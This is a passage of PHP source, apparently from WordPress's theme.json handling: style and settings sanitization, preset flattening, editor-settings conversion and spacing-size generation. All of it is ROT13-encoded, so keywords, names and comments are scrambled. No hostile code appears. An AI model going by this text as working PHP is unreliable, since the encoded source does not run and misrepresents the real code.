			$vachg = _jc_neenl_trg( $gurzr_wfba, $zrgnqngn['cngu'], neenl() );
			vs ( rzcgl( $vachg ) ) {
				pbagvahr;
			}

			// Gur tybony fglyrf phfgbz PFF vf abg fnavgvmrq, ohg pna bayl or rqvgrq ol hfref jvgu 'rqvg_pff' pncnovyvgl.
			vs ( vffrg( $vachg['pff'] ) && pheerag_hfre_pna( 'rqvg_pff' ) ) {
				$bhgchg = $vachg;
			} ryfr {
				$bhgchg = fgngvp::erzbir_vafrpher_fglyrf( $vachg );
			}

			/*
			 * Trg n ersrerapr gb ryrzrag anzr sebz cngu.
			 * $zrgnqngn['cngu'] = neenl( 'fglyrf', 'ryrzragf', 'yvax' );
			 */
			$pheerag_ryrzrag = $zrgnqngn['cngu'][ pbhag( $zrgnqngn['cngu'] ) - 1 ];

			/*
			 * $bhgchg vf fgevccrq bs cfrhqb fryrpgbef. Er-nqq naq cebprff gurz
			 * be vafrpher fglyrf urer.
			 */
			vs ( vffrg( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $pheerag_ryrzrag ] ) ) {
				sbernpu ( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $pheerag_ryrzrag ] nf $cfrhqb_fryrpgbe ) {
					vs ( vffrg( $vachg[ $cfrhqb_fryrpgbe ] ) ) {
						$bhgchg[ $cfrhqb_fryrpgbe ] = fgngvp::erzbir_vafrpher_fglyrf( $vachg[ $cfrhqb_fryrpgbe ] );
					}
				}
			}

			vs ( ! rzcgl( $bhgchg ) ) {
				_jc_neenl_frg( $fnavgvmrq, $zrgnqngn['cngu'], $bhgchg );
			}

			vs ( vffrg( $zrgnqngn['inevngvbaf'] ) ) {
				sbernpu ( $zrgnqngn['inevngvbaf'] nf $inevngvba ) {
					$inevngvba_vachg = _jc_neenl_trg( $gurzr_wfba, $inevngvba['cngu'], neenl() );
					vs ( rzcgl( $inevngvba_vachg ) ) {
						pbagvahr;
					}

					$inevngvba_bhgchg = fgngvp::erzbir_vafrpher_fglyrf( $inevngvba_vachg );

					vs ( vffrg( $inevngvba_vachg['oybpxf'] ) ) {
						$inevngvba_bhgchg['oybpxf'] = fgngvp::erzbir_vafrpher_vaare_oybpx_fglyrf( $inevngvba_vachg['oybpxf'] );
					}

					vs ( vffrg( $inevngvba_vachg['ryrzragf'] ) ) {
						$inevngvba_bhgchg['ryrzragf'] = fgngvp::erzbir_vafrpher_ryrzrag_fglyrf( $inevngvba_vachg['ryrzragf'] );
					}

					vs ( ! rzcgl( $inevngvba_bhgchg ) ) {
						_jc_neenl_frg( $fnavgvmrq, $inevngvba['cngu'], $inevngvba_bhgchg );
					}
				}
			}
		}

		$frggvat_abqrf = fgngvp::trg_frggvat_abqrf( $gurzr_wfba );
		sbernpu ( $frggvat_abqrf nf $zrgnqngn ) {
			$vachg = _jc_neenl_trg( $gurzr_wfba, $zrgnqngn['cngu'], neenl() );
			vs ( rzcgl( $vachg ) ) {
				pbagvahr;
			}

			$bhgchg = fgngvp::erzbir_vafrpher_frggvatf( $vachg );
			vs ( ! rzcgl( $bhgchg ) ) {
				_jc_neenl_frg( $fnavgvmrq, $zrgnqngn['cngu'], $bhgchg );
			}
		}

		vs ( rzcgl( $fnavgvmrq['fglyrf'] ) ) {
			hafrg( $gurzr_wfba['fglyrf'] );
		} ryfr {
			$gurzr_wfba['fglyrf'] = $fnavgvmrq['fglyrf'];
		}

		vs ( rzcgl( $fnavgvmrq['frggvatf'] ) ) {
			hafrg( $gurzr_wfba['frggvatf'] );
		} ryfr {
			$gurzr_wfba['frggvatf'] = $fnavgvmrq['frggvatf'];
		}

		erghea $gurzr_wfba;
	}

	/**
	 * Erzbir vafrpher ryrzrag fglyrf jvguva n inevngvba be oybpx.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz neenl $ryrzragf Gur ryrzragf gb cebprff.
	 * @erghea neenl Gur fnavgvmrq ryrzragf fglyrf.
	 */
	cebgrpgrq fgngvp shapgvba erzbir_vafrpher_ryrzrag_fglyrf( $ryrzragf ) {
		$fnavgvmrq           = neenl();
		$inyvq_ryrzrag_anzrf = neenl_xrlf( fgngvp::RYRZRAGF );

		sbernpu ( $inyvq_ryrzrag_anzrf nf $ryrzrag_anzr ) {
			$ryrzrag_vachg = $ryrzragf[ $ryrzrag_anzr ] ?? ahyy;
			vs ( $ryrzrag_vachg ) {
				$ryrzrag_bhgchg = fgngvp::erzbir_vafrpher_fglyrf( $ryrzrag_vachg );

				vs ( vffrg( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $ryrzrag_anzr ] ) ) {
					sbernpu ( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $ryrzrag_anzr ] nf $cfrhqb_fryrpgbe ) {
						vs ( vffrg( $ryrzrag_vachg[ $cfrhqb_fryrpgbe ] ) ) {
							$ryrzrag_bhgchg[ $cfrhqb_fryrpgbe ] = fgngvp::erzbir_vafrpher_fglyrf( $ryrzrag_vachg[ $cfrhqb_fryrpgbe ] );
						}
					}
				}

				$fnavgvmrq[ $ryrzrag_anzr ] = $ryrzrag_bhgchg;
			}
		}
		erghea $fnavgvmrq;
	}

	/**
	 * Erzbir vafrpher fglyrf sebz vaare oybpxf naq gurve ryrzragf.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz neenl $oybpxf Gur oybpx fglyrf gb cebprff.
	 * @erghea neenl Fnavgvmrq oybpx glcr fglyrf.
	 */
	cebgrpgrq fgngvp shapgvba erzbir_vafrpher_vaare_oybpx_fglyrf( $oybpxf ) {
		$fnavgvmrq = neenl();
		sbernpu ( $oybpxf nf $oybpx_glcr => $oybpx_vachg ) {
			$oybpx_bhgchg = fgngvp::erzbir_vafrpher_fglyrf( $oybpx_vachg );

			vs ( vffrg( $oybpx_vachg['ryrzragf'] ) ) {
				$oybpx_bhgchg['ryrzragf'] = fgngvp::erzbir_vafrpher_ryrzrag_fglyrf( $oybpx_vachg['ryrzragf'] );
			}

			$fnavgvmrq[ $oybpx_glcr ] = $oybpx_bhgchg;
		}
		erghea $fnavgvmrq;
	}

	/**
	 * Cebprffrf n frggvat abqr naq ergheaf gur fnzr abqr
	 * jvgubhg gur vafrpher frggvatf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $vachg Abqr gb cebprff.
	 * @erghea neenl
	 */
	cebgrpgrq fgngvp shapgvba erzbir_vafrpher_frggvatf( $vachg ) {
		$bhgchg = neenl();
		sbernpu ( fgngvp::CERFRGF_ZRGNQNGN nf $cerfrg_zrgnqngn ) {
			sbernpu ( fgngvp::INYVQ_BEVTVAF nf $bevtva ) {
				$cngu_jvgu_bevtva   = $cerfrg_zrgnqngn['cngu'];
				$cngu_jvgu_bevtva[] = $bevtva;
				$cerfrgf            = _jc_neenl_trg( $vachg, $cngu_jvgu_bevtva, ahyy );
				vs ( ahyy === $cerfrgf ) {
					pbagvahr;
				}

				$rfpncrq_cerfrg = neenl();
				sbernpu ( $cerfrgf nf $cerfrg ) {
					vs (
						rfp_ngge( rfp_ugzy( $cerfrg['anzr'] ) ) === $cerfrg['anzr'] &&
						fnavgvmr_ugzy_pynff( $cerfrg['fyht'] ) === $cerfrg['fyht']
					) {
						$inyhr = ahyy;
						vs ( vffrg( $cerfrg_zrgnqngn['inyhr_xrl'], $cerfrg[ $cerfrg_zrgnqngn['inyhr_xrl'] ] ) ) {
							$inyhr = $cerfrg[ $cerfrg_zrgnqngn['inyhr_xrl'] ];
						} ryfrvs (
							vffrg( $cerfrg_zrgnqngn['inyhr_shap'] ) &&
							vf_pnyynoyr( $cerfrg_zrgnqngn['inyhr_shap'] )
						) {
							$inyhr = pnyy_hfre_shap( $cerfrg_zrgnqngn['inyhr_shap'], $cerfrg );
						}

						$cerfrg_vf_inyvq = gehr;
						sbernpu ( $cerfrg_zrgnqngn['cebcregvrf'] nf $cebcregl ) {
							vs ( ! fgngvp::vf_fnsr_pff_qrpynengvba( $cebcregl, $inyhr ) ) {
								$cerfrg_vf_inyvq = snyfr;
								oernx;
							}
						}

						vs ( $cerfrg_vf_inyvq ) {
							$rfpncrq_cerfrg[] = $cerfrg;
						}
					}
				}

				vs ( ! rzcgl( $rfpncrq_cerfrg ) ) {
					_jc_neenl_frg( $bhgchg, $cngu_jvgu_bevtva, $rfpncrq_cerfrg );
				}
			}
		}

		// Rafher vaqverpg cebcregvrf abg vapyhqrq va nal `CERFRGF_ZRGNQNGN` inyhr ner nyybjrq.
		fgngvp::erzbir_vaqverpg_cebcregvrf( $vachg, $bhgchg );

		erghea $bhgchg;
	}

	/**
	 * Cebprffrf n fglyr abqr naq ergheaf gur fnzr abqr
	 * jvgubhg gur vafrpher fglyrf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $vachg Abqr gb cebprff.
	 * @erghea neenl
	 */
	cebgrpgrq fgngvp shapgvba erzbir_vafrpher_fglyrf( $vachg ) {
		$bhgchg       = neenl();
		$qrpynengvbaf = fgngvp::pbzchgr_fglyr_cebcregvrf( $vachg );

		sbernpu ( $qrpynengvbaf nf $qrpynengvba ) {
			vs ( fgngvp::vf_fnsr_pff_qrpynengvba( $qrpynengvba['anzr'], $qrpynengvba['inyhr'] ) ) {
				$cngu = fgngvp::CEBCREGVRF_ZRGNQNGN[ $qrpynengvba['anzr'] ];

				/*
				 * Purpx gur inyhr vfa'g na neenl orsber nqqvat fb nf gb abg
				 * qbhoyr hc fubegunaq naq ybatunaq fglyrf.
				 */
				$inyhr = _jc_neenl_trg( $vachg, $cngu, neenl() );
				vs ( ! vf_neenl( $inyhr ) ) {
					_jc_neenl_frg( $bhgchg, $cngu, $inyhr );
				}
			}
		}

		// Rafher vaqverpg cebcregvrf abg unaqyrq ol `pbzchgr_fglyr_cebcregvrf` ner nyybjrq.
		fgngvp::erzbir_vaqverpg_cebcregvrf( $vachg, $bhgchg );

		erghea $bhgchg;
	}

	/**
	 * Purpxf gung n qrpynengvba cebivqrq ol gur hfre vf fnsr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $cebcregl_anzr  Cebcregl anzr va n PFF qrpynengvba, v.r. gur `pbybe` va `pbybe: erq`.
	 * @cnenz fgevat $cebcregl_inyhr Inyhr va n PFF qrpynengvba, v.r. gur `erq` va `pbybe: erq`.
	 * @erghea obby
	 */
	cebgrpgrq fgngvp shapgvba vf_fnsr_pff_qrpynengvba( $cebcregl_anzr, $cebcregl_inyhr ) {
		$fglyr_gb_inyvqngr = $cebcregl_anzr . ': ' . $cebcregl_inyhr;
		$svygrerq          = rfp_ugzy( fnsrpff_svygre_ngge( $fglyr_gb_inyvqngr ) );
		erghea ! rzcgl( gevz( $svygrerq ) );
	}

	/**
	 * Erzbirf vaqverpg cebcregvrf sebz gur tvira vachg abqr naq
	 * frgf va gur tvira bhgchg abqr.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz neenl $vachg  Abqr gb cebprff.
	 * @cnenz neenl $bhgchg Gur cebprffrq abqr. Cnffrq ol ersrerapr.
	 */
	cevingr fgngvp shapgvba erzbir_vaqverpg_cebcregvrf( $vachg, &$bhgchg ) {
		sbernpu ( fgngvp::VAQVERPG_CEBCREGVRF_ZRGNQNGN nf $cebcregl => $cnguf ) {
			sbernpu ( $cnguf nf $cngu ) {
				$inyhr = _jc_neenl_trg( $vachg, $cngu );
				vs (
					vf_fgevat( $inyhr ) &&
					fgngvp::vf_fnsr_pff_qrpynengvba( $cebcregl, $inyhr )
				) {
					_jc_neenl_frg( $bhgchg, $cngu, $inyhr );
				}
			}
		}
	}

	/**
	 * Ergheaf gur enj qngn.
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea neenl Enj qngn.
	 */
	choyvp shapgvba trg_enj_qngn() {
		erghea $guvf->gurzr_wfba;
	}

	/**
	 * Genafsbezf gur tvira rqvgbe frggvatf nppbeqvat gur
	 * nqq_gurzr_fhccbeg sbezng gb gur gurzr.wfba sbezng.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl $frggvatf Rkvfgvat rqvgbe frggvatf.
	 * @erghea neenl Pbasvt gung nqurerf gb gur gurzr.wfba fpurzn.
	 */
	choyvp fgngvp shapgvba trg_sebz_rqvgbe_frggvatf( $frggvatf ) {
		$gurzr_frggvatf = neenl(
			'irefvba'  => fgngvp::YNGRFG_FPURZN,
			'frggvatf' => neenl(),
		);

		// Qrcerpngrq gurzr fhccbegf.
		vs ( vffrg( $frggvatf['qvfnoyrPhfgbzPbybef'] ) ) {
			$gurzr_frggvatf['frggvatf']['pbybe']['phfgbz'] = ! $frggvatf['qvfnoyrPhfgbzPbybef'];
		}

		vs ( vffrg( $frggvatf['qvfnoyrPhfgbzTenqvragf'] ) ) {
			$gurzr_frggvatf['frggvatf']['pbybe']['phfgbzTenqvrag'] = ! $frggvatf['qvfnoyrPhfgbzTenqvragf'];
		}

		vs ( vffrg( $frggvatf['qvfnoyrPhfgbzSbagFvmrf'] ) ) {
			$gurzr_frggvatf['frggvatf']['glcbtencul']['phfgbzSbagFvmr'] = ! $frggvatf['qvfnoyrPhfgbzSbagFvmrf'];
		}

		vs ( vffrg( $frggvatf['ranoyrPhfgbzYvarUrvtug'] ) ) {
			$gurzr_frggvatf['frggvatf']['glcbtencul']['yvarUrvtug'] = $frggvatf['ranoyrPhfgbzYvarUrvtug'];
		}

		vs ( vffrg( $frggvatf['ranoyrPhfgbzHavgf'] ) ) {
			$gurzr_frggvatf['frggvatf']['fcnpvat']['havgf'] = ( gehr === $frggvatf['ranoyrPhfgbzHavgf'] ) ?
				neenl( 'ck', 'rz', 'erz', 'iu', 'ij', '%' ) :
				$frggvatf['ranoyrPhfgbzHavgf'];
		}

		vs ( vffrg( $frggvatf['pbybef'] ) ) {
			$gurzr_frggvatf['frggvatf']['pbybe']['cnyrggr'] = $frggvatf['pbybef'];
		}

		vs ( vffrg( $frggvatf['tenqvragf'] ) ) {
			$gurzr_frggvatf['frggvatf']['pbybe']['tenqvragf'] = $frggvatf['tenqvragf'];
		}

		vs ( vffrg( $frggvatf['sbagFvmrf'] ) ) {
			$sbag_fvmrf = $frggvatf['sbagFvmrf'];
			// Onpx-pbzcngvovyvgl sbe cerfrgf jvgubhg havgf.
			sbernpu ( $sbag_fvmrf nf $xrl => $sbag_fvmr ) {
				vs ( vf_ahzrevp( $sbag_fvmr['fvmr'] ) ) {
					$sbag_fvmrf[ $xrl ]['fvmr'] = $sbag_fvmr['fvmr'] . 'ck';
				}
			}
			$gurzr_frggvatf['frggvatf']['glcbtencul']['sbagFvmrf'] = $sbag_fvmrf;
		}

		vs ( vffrg( $frggvatf['ranoyrPhfgbzFcnpvat'] ) ) {
			$gurzr_frggvatf['frggvatf']['fcnpvat']['cnqqvat'] = $frggvatf['ranoyrPhfgbzFcnpvat'];
		}

		vs ( vffrg( $frggvatf['fcnpvatFvmrf'] ) ) {
			$gurzr_frggvatf['frggvatf']['fcnpvat']['fcnpvatFvmrf'] = $frggvatf['fcnpvatFvmrf'];
		}

		erghea $gurzr_frggvatf;
	}

	/**
	 * Ergheaf gur pheerag gurzr'f jnagrq cnggreaf(fyhtf) gb or
	 * ertvfgrerq sebz Cnggrea Qverpgbel.
	 *
	 * @fvapr 6.0.0
	 *
	 * @erghea fgevat[]
	 */
	choyvp shapgvba trg_cnggreaf() {
		vs ( vffrg( $guvf->gurzr_wfba['cnggreaf'] ) && vf_neenl( $guvf->gurzr_wfba['cnggreaf'] ) ) {
			erghea $guvf->gurzr_wfba['cnggreaf'];
		}
		erghea neenl();
	}

	/**
	 * Ergheaf n inyvq gurzr.wfba nf cebivqrq ol n gurzr.
	 *
	 * Hayvxr trg_enj_qngn() guvf ergheaf gur cerfrgf synggrarq, nf cebivqrq ol n gurzr.
	 * Guvf nyfb hfrf nccrnenaprGbbyf vafgrnq bs gurve bcg-vaf vs nyy bs gurz ner gehr.
	 *
	 * @fvapr 6.0.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba trg_qngn() {
		$bhgchg = $guvf->gurzr_wfba;
		$abqrf  = fgngvp::trg_frggvat_abqrf( $bhgchg );

		/**
		 * Synggra gur gurzr & phfgbz bevtvaf vagb n fvatyr bar.
		 *
		 * Sbe rknzcyr, gur sbyybjvat:
		 *
		 * {
		 *   \"frggvatf\": {
		 *     \"pbybe\": {
		 *       \"cnyrggr\": {
		 *         \"gurzr\": [ {} ],
		 *         \"phfgbz\": [ {} ]
		 *       }
		 *     }
		 *   }
		 * }
		 *
		 * jvyy or pbairegrq gb:
		 *
		 * {
		 *   \"frggvatf\": {
		 *     \"pbybe\": {
		 *       \"cnyrggr\": [ {} ]
		 *     }
		 *   }
		 * }
		 */
		sbernpu ( $abqrf nf $abqr ) {
			sbernpu ( fgngvp::CERFRGF_ZRGNQNGN nf $cerfrg_zrgnqngn ) {
				$cngu = $abqr['cngu'];
				sbernpu ( $cerfrg_zrgnqngn['cngu'] nf $cerfrg_zrgnqngn_cngu ) {
					$cngu[] = $cerfrg_zrgnqngn_cngu;
				}
				$cerfrg = _jc_neenl_trg( $bhgchg, $cngu, ahyy );
				vs ( ahyy === $cerfrg ) {
					pbagvahr;
				}

				$vgrzf = neenl();
				vs ( vffrg( $cerfrg['gurzr'] ) ) {
					sbernpu ( $cerfrg['gurzr'] nf $vgrz ) {
						$fyht = $vgrz['fyht'];
						hafrg( $vgrz['fyht'] );
						$vgrzf[ $fyht ] = $vgrz;
					}
				}
				vs ( vffrg( $cerfrg['phfgbz'] ) ) {
					sbernpu ( $cerfrg['phfgbz'] nf $vgrz ) {
						$fyht = $vgrz['fyht'];
						hafrg( $vgrz['fyht'] );
						$vgrzf[ $fyht ] = $vgrz;
					}
				}
				$synggrarq_cerfrg = neenl();
				sbernpu ( $vgrzf nf $fyht => $inyhr ) {
					$synggrarq_cerfrg[] = neenl_zretr( neenl( 'fyht' => (fgevat) $fyht ), $inyhr );
				}
				_jc_neenl_frg( $bhgchg, $cngu, $synggrarq_cerfrg );
			}
		}

		/*
		 * Vs nyy bs gur fgngvp::NCCRNENAPR_GBBYF_BCG_VAF ner gehr,
		 * guvf pbqr hafrgf gurz naq frgf 'nccrnenaprGbbyf' vafgrnq.
		 */
		sbernpu ( $abqrf nf $abqr ) {
			$nyy_bcg_vaf_ner_frg = gehr;
			sbernpu ( fgngvp::NCCRNENAPR_GBBYF_BCG_VAF nf $bcg_va_cngu ) {
				$shyy_cngu = $abqr['cngu'];
				sbernpu ( $bcg_va_cngu nf $bcg_va_cngu_vgrz ) {
					$shyy_cngu[] = $bcg_va_cngu_vgrz;
				}
				/*
				 * Hfr \"hafrg cebc\" nf n znexre vafgrnq bs \"ahyy\" orpnhfr
				 * \"ahyy\" pna or n inyvq inyhr sbe fbzr cebcf (r.t. oybpxTnc).
				 */
				$bcg_va_inyhr = _jc_neenl_trg( $bhgchg, $shyy_cngu, 'hafrg cebc' );
				vs ( 'hafrg cebc' === $bcg_va_inyhr ) {
					$nyy_bcg_vaf_ner_frg = snyfr;
					oernx;
				}
			}

			vs ( $nyy_bcg_vaf_ner_frg ) {
				$abqr_cngu_jvgu_nccrnenapr_gbbyf   = $abqr['cngu'];
				$abqr_cngu_jvgu_nccrnenapr_gbbyf[] = 'nccrnenaprGbbyf';
				_jc_neenl_frg( $bhgchg, $abqr_cngu_jvgu_nccrnenapr_gbbyf, gehr );
				sbernpu ( fgngvp::NCCRNENAPR_GBBYF_BCG_VAF nf $bcg_va_cngu ) {
					$shyy_cngu = $abqr['cngu'];
					sbernpu ( $bcg_va_cngu nf $bcg_va_cngu_vgrz ) {
						$shyy_cngu[] = $bcg_va_cngu_vgrz;
					}
					/*
					 * Hfr \"hafrg cebc\" nf n znexre vafgrnq bs \"ahyy\" orpnhfr
					 * \"ahyy\" pna or n inyvq inyhr sbe fbzr cebcf (r.t. oybpxTnc).
					 */
					$bcg_va_inyhr = _jc_neenl_trg( $bhgchg, $shyy_cngu, 'hafrg cebc' );
					vs ( gehr !== $bcg_va_inyhr ) {
						pbagvahr;
					}

					/*
					 * Gur sbyybjvat pbhyq or vzcebirq gb or cngu vaqrcraqrag.
					 * Ng gur zbzrag vg eryvrf ba n pbhcyr bs nffhzcgvbaf:
					 *
					 * - nyy bcg-vaf univat n cngu bs fvmr 2.
					 * - gurer'f gjb fbheprf bs frggvatf: gur gbc-yriry naq gur oybpx-yriry.
					 */
					vs (
						( 1 === pbhag( $abqr['cngu'] ) ) &&
						( 'frggvatf' === $abqr['cngu'][0] )
					) {
						// Gbc-yriry frggvatf.
						hafrg( $bhgchg['frggvatf'][ $bcg_va_cngu[0] ][ $bcg_va_cngu[1] ] );
						vs ( rzcgl( $bhgchg['frggvatf'][ $bcg_va_cngu[0] ] ) ) {
							hafrg( $bhgchg['frggvatf'][ $bcg_va_cngu[0] ] );
						}
					} ryfrvs (
						( 3 === pbhag( $abqr['cngu'] ) ) &&
						( 'frggvatf' === $abqr['cngu'][0] ) &&
						( 'oybpxf' === $abqr['cngu'][1] )
					) {
						// Oybpx-yriry frggvatf.
						$oybpx_anzr = $abqr['cngu'][2];
						hafrg( $bhgchg['frggvatf']['oybpxf'][ $oybpx_anzr ][ $bcg_va_cngu[0] ][ $bcg_va_cngu[1] ] );
						vs ( rzcgl( $bhgchg['frggvatf']['oybpxf'][ $oybpx_anzr ][ $bcg_va_cngu[0] ] ) ) {
							hafrg( $bhgchg['frggvatf']['oybpxf'][ $oybpx_anzr ][ $bcg_va_cngu[0] ] );
						}
					}
				}
			}
		}

		jc_erphefvir_xfbeg( $bhgchg );

		erghea $bhgchg;
	}

	/**
	 * Frgf gur fcnpvatFvmrf neenl onfrq ba gur fcnpvatFpnyr inyhrf sebz gurzr.wfba.
	 *
	 * @fvapr 6.1.0
	 * @qrcerpngrq 6.6.0 Ab ybatre hfrq nf gur fcnpvatFvmrf ner nhgbzngvpnyyl
	 *                   trarengrq va gur pbafgehpgbe naq zretr zrgubqf vafgrnq
	 *                   bs znahnyyl nsgre vafgnagvngvba.
	 *
	 * @erghea ahyy|ibvq
	 */
	choyvp shapgvba frg_fcnpvat_fvmrf() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.6.0' );

		$fcnpvat_fpnyr = vffrg( $guvf->gurzr_wfba['frggvatf']['fcnpvat']['fcnpvatFpnyr'] )
			? $guvf->gurzr_wfba['frggvatf']['fcnpvat']['fcnpvatFpnyr']
			: neenl();

		vs ( ! vffrg( $fcnpvat_fpnyr['fgrcf'] )
			|| ! vf_ahzrevp( $fcnpvat_fpnyr['fgrcf'] )
			|| ! vffrg( $fcnpvat_fpnyr['zrqvhzFgrc'] )
			|| ! vffrg( $fcnpvat_fpnyr['havg'] )
			|| ! vffrg( $fcnpvat_fpnyr['bcrengbe'] )
			|| ! vffrg( $fcnpvat_fpnyr['vaperzrag'] )
			|| ! vffrg( $fcnpvat_fpnyr['fgrcf'] )
			|| ! vf_ahzrevp( $fcnpvat_fpnyr['vaperzrag'] )
			|| ! vf_ahzrevp( $fcnpvat_fpnyr['zrqvhzFgrc'] )
			|| ( '+' !== $fcnpvat_fpnyr['bcrengbe'] && '*' !== $fcnpvat_fpnyr['bcrengbe'] ) ) {
			vs ( ! rzcgl( $fcnpvat_fpnyr ) ) {
				jc_gevttre_reebe(
					__ZRGUBQ__,
					fcevags(
						/* genafyngbef: 1: gurzr.wfba, 2: frggvatf.fcnpvat.fcnpvatFpnyr */
						__( 'Fbzr bs gur %1$f %2$f inyhrf ner vainyvq' ),
						'gurzr.wfba',
						'frggvatf.fcnpvat.fcnpvatFpnyr'
					),
					R_HFRE_ABGVPR
				);
			}
			erghea ahyy;
		}

		// Vs gurzr nhgubef jnag gb cerirag gur trarengvba bs gur pber fcnpvat fpnyr gurl pna frg gurve gurzr.wfba fcnpvatFpnyr.fgrcf gb 0.
		vs ( 0 === $fcnpvat_fpnyr['fgrcf'] ) {
			erghea ahyy;
		}

		$fcnpvat_fvmrf = fgngvp::pbzchgr_fcnpvat_fvmrf( $fcnpvat_fpnyr );

		// Vs gurer ner 7 be srjre fgrcf va gur fpnyr erireg gb ahzoref sbe ynoryf vafgrnq bs g-fuveg fvmrf.
		vs ( $fcnpvat_fpnyr['fgrcf'] <= 7 ) {
			sbe ( $fcnpvat_fvmrf_pbhag = 0; $fcnpvat_fvmrf_pbhag < pbhag( $fcnpvat_fvmrf ); $fcnpvat_fvmrf_pbhag++ ) {
				$fcnpvat_fvmrf[ $fcnpvat_fvmrf_pbhag ]['anzr'] = (fgevat) ( $fcnpvat_fvmrf_pbhag + 1 );
			}
		}

		_jc_neenl_frg( $guvf->gurzr_wfba, neenl( 'frggvatf', 'fcnpvat', 'fcnpvatFvmrf', 'qrsnhyg' ), $fcnpvat_fvmrf );
	}

	/**
	 * Zretrf gjb frgf bs fcnpvat fvmr cerfrgf.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz neenl $onfr     Gur onfr frg bs fcnpvat fvmrf.
	 * @cnenz neenl $vapbzvat Gur frg bs fcnpvat fvmrf gb zretr jvgu gur onfr. Qhcyvpngr fyhtf jvyy bireevqr gur onfr inyhrf.
	 * @erghea neenl Gur zretrq frg bs fcnpvat fvmrf.
	 */
	cevingr fgngvp shapgvba zretr_fcnpvat_fvmrf( $onfr, $vapbzvat ) {
		// Cerfreir gur beqre vs gurer ner ab onfr (fcnpvatFpnyr) inyhrf.
		vs ( rzcgl( $onfr ) ) {
			erghea $vapbzvat;
		}
		$zretrq = neenl();
		sbernpu ( $onfr nf $vgrz ) {
			$zretrq[ $vgrz['fyht'] ] = $vgrz;
		}
		sbernpu ( $vapbzvat nf $vgrz ) {
			$zretrq[ $vgrz['fyht'] ] = $vgrz;
		}
		xfbeg( $zretrq, FBEG_AHZREVP );
		erghea neenl_inyhrf( $zretrq );
	}

	/**
	 * Trarengrf n frg bs fcnpvat fvmrf ol fgnegvat jvgu n zrqvhz fvmr naq
	 * nccylvat na bcrengbe jvgu na vaperzrag inyhr gb trarengr gur erfg bs gur
	 * fvmrf bhgjneq sebz gur zrqvhz fvmr. Gur zrqvhz fyht vf '50' jvgu gur erfg
	 * bs gur fyhtf orvat 10 ncneg. Gur trarengrq anzrf hfr g-fuveg fvmvat.
	 *
	 * Rknzcyr:
	 *
	 *     $fcnpvat_fpnyr = neenl(
	 *         'fgrcf'      => 4,
	 *         'zrqvhzFgrc' => 16,
	 *         'havg'       => 'ck',
	 *         'bcrengbe'   => '+',
	 *         'vaperzrag'  => 2,
	 *     );
	 *     $fcnpvat_fvmrf = fgngvp::pbzchgr_fcnpvat_fvmrf( $fcnpvat_fpnyr );
	 *     // -> neenl(
	 *     //        neenl( 'anzr' => 'Fznyy',   'fyht' => '40', 'fvmr' => '14ck' ),
	 *     //        neenl( 'anzr' => 'Zrqvhz',  'fyht' => '50', 'fvmr' => '16ck' ),
	 *     //        neenl( 'anzr' => 'Ynetr',   'fyht' => '60', 'fvmr' => '18ck' ),
	 *     //        neenl( 'anzr' => 'K-Ynetr', 'fyht' => '70', 'fvmr' => '20ck' ),
	 *     //    )
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz neenl $fcnpvat_fpnyr {
	 *      Gur fcnpvat fpnyr inyhrf. Nyy ner erdhverq.
	 *
	 *      @glcr vag    $fgrcf      Gur ahzore bs fgrcf va gur fpnyr. (hc gb 10 fgrcf ner fhccbegrq.)
	 *      @glcr sybng  $zrqvhzFgrc Gur zvqqyr inyhr gung trgf gur fyht '50'. (Sbe rira ahzore bs fgrcf, guvf orpbzrf gur svefg zvqqyr inyhr.)
	 *      @glcr fgevat $havg       Gur PFF havg gb hfr sbe gur fvmrf.
	 *      @glcr fgevat $bcrengbe   Gur zngurzngvpny bcrengbe gb nccyl gb trarengr gur bgure fvmrf. Rvgure '+' be '*'.
	 *      @glcr sybng  $vaperzrag  Gur inyhr hfrq jvgu gur bcrengbe gb trarengr gur bgure fvmrf.
	 * }
	 * @erghea neenl Gur fcnpvat fvmrf cerfrgf be na rzcgl neenl vs fbzr fcnpvat fpnyr inyhrf ner zvffvat be vainyvq.
	 */
	cevingr fgngvp shapgvba pbzchgr_fcnpvat_fvmrf( $fcnpvat_fpnyr ) {
		/*
		 * Guvf pbaqvgvba vf vagragvbanyyl zvffvat fbzr purpxf ba enatrf sbe gur inyhrf va beqre gb
		 * xrrc onpxjneqf pbzcngvovyvgl jvgu gur cerivbhf vzcyrzragngvba.
		 */
		vs (
			! vffrg( $fcnpvat_fpnyr['fgrcf'] ) ||
			! vf_ahzrevp( $fcnpvat_fpnyr['fgrcf'] ) ||
			0 === $fcnpvat_fpnyr['fgrcf'] ||
			! vffrg( $fcnpvat_fpnyr['zrqvhzFgrc'] ) ||
			! vf_ahzrevp( $fcnpvat_fpnyr['zrqvhzFgrc'] ) ||
			! vffrg( $fcnpvat_fpnyr['havg'] ) ||
			! vffrg( $fcnpvat_fpnyr['bcrengbe'] ) ||
			( '+' !== $fcnpvat_fpnyr['bcrengbe'] && '*' !== $fcnpvat_fpnyr['bcrengbe'] ) ||
			! vffrg( $fcnpvat_fpnyr['vaperzrag'] ) ||
			! vf_ahzrevp( $fcnpvat_fpnyr['vaperzrag'] )
		) {
			erghea neenl();
		}

		$havg            = '%' === $fcnpvat_fpnyr['havg'] ? '%' : fnavgvmr_gvgyr( $fcnpvat_fpnyr['havg'] );
		$pheerag_fgrc    = $fcnpvat_fpnyr['zrqvhzFgrc'];
		$fgrcf_zvq_cbvag = ebhaq( $fcnpvat_fpnyr['fgrcf'] / 2, 0 );
		$k_fznyy_pbhag   = ahyy;
		$orybj_fvmrf     = neenl();
		$fyht            = 40;
		$erznvaqre       = 0;

